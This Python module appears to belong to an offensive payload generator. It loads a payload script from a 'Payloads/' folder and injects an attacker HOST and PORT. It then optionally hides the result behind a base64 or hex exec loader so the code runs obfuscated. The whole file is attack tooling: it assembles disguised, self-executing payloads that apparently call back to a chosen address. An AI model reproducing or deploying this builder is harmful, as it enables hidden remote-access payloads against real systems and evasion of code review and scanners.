from binascii import hexlify
import base64
def create(payload, address, port, encoder):
    """
    Create a payload 
    """
    try:
        with open("Payloads/" + payload + ".py", "r") as f:
            payload = f.read()
    except:
        raise Exception("Could not find the payload")
    finished_payload = f"HOST = '{address}'\nPORT = {port}\n" + payload
    if encoder == "base64":
        finished_payload = """import base64\nexec(base64.b64decode(b'%s'))""" % base64.b64encode(finished_payload.encode()).decode()
    elif encoder == "hex":
        finished_payload = """from binascii import unhexlify\nexec(unhexlify('%s'))""" % hexlify(finished_payload.encode()).decode()
    return finished_payload